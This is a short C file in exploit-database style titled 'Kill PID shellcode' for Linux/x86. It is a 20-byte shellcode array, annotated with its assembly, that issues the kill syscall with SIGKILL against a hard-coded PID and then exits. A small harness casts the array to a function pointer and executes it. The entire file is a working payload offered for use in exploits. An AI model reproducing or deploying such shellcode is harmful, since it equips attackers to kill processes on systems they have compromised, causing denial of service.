/*
     Exploit Title: Kill PID shellcode
     Date: 06/23/2018
     Exploit Author: Nathu Nandwani
     Platform: Linux/x86
     Size: 20 bytes
*/
#include <string.h>
#include <stdio.h>
int main() 
{
	
	char shellcode[] = 
	"\x31\xc0" /* xor eax, eax */
	"\xb0\x25" /* mov al, 0x25 - SYS_KILL */
	"\x89\xc3" /* mov ebx, eax */
	"\x89\xc1" /* mov ecx, eax */
	"\x66\xbb" /* mov bx, ? */
	"\xF1\x0A" /* bx <= pid => 2801 = 0x0AF1 */
	"\xb1\x09" /* mov cl, 0x09 - SIGKILL */
	"\xcd\x80" /* int 0x80 */
	"\xb0\x01" /* mov al, 0x01 */
	"\xcd\x80"; /* int 0x80 */
	printf("Shellcode length: %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}
